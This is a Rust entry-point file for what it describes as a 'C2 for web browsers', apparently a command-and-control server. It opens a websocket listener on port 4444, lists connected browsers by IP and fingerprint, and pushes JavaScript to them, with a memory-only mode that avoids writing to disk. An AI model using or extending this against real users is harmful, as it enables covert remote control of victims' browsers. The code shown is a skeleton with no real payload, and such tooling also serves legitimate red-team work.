mod api;
mod data;
mod model;
mod path;
mod websocket;
mod tcp;
pub mod config;

use std::thread;
use crate::tcp::tcp_socket;
use core::time::Duration;
use std::sync::{Arc, Mutex};
use std::io::{stdin, stdout, Write};
// use clap::{Command, Arg, crate_version, crate_authors, crate_description };
//use hibro::path::create;
use clap::Parser;

/// C2 for web browsers
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Start tui
    #[arg(short, long)]
    ui: bool,

    /// Do not save any data at disk
    #[arg(short, long)]
    memfilesys: bool,
}

fn argparser() {

    let args = Args::parse();

    let ui = args.ui;
    let memfilesys = args.memfilesys;

    if ui == true {
    	println!("UI: {:?}", ui);
   	 }

    if memfilesys == true {
	println!("Guardado en memoria: {:?}", memfilesys);
    	}

}

fn main() {

    argparser();
    // let args: Vec<String> = std::env::args().collect();    let args: Vec<String> = std::env::args().collect();
    //
    // for arg in args {
    //     println!("Argument: {}", arg);
    // }
    // test_websocket();
    // for item in config::whitelist(true) {
    //     println!("{}", item);
    // }
    // test_websocket();

}

fn test_sync() {
    config::sync_plugins();
    thread::sleep(Duration::from_millis(5000))
}

fn test_websocket() {

    // open a web socket
    let connections: Arc<Mutex<Vec<model::connection::Connection>>> = Arc::new(Mutex::new(Vec::new()));
    let connections_clone = connections.clone();
    thread::spawn(move || {
        websocket::open_ws("0.0.0.0", "4444", connections_clone);
    });

    loop {
        print!("command: ");
        stdout().flush().expect("Error flushing stdout");
        let mut response = String::new();
        stdin().read_line(&mut response).expect("Error reading line from stdin");
        let response = response.trim();

        if response == "connections" {

            for connection in connections.clone().lock().unwrap().iter() {
                println!("{} - {} - {}", connection.sender.as_ref().unwrap().connection_id(), connection.ip, connection.fingerprint);
            }

        } else if response.contains("send")  {

            api::send(&*connections.lock().unwrap(), String::from("const main = () => { let my_first_variable = 1; };"));

        }

    }
}
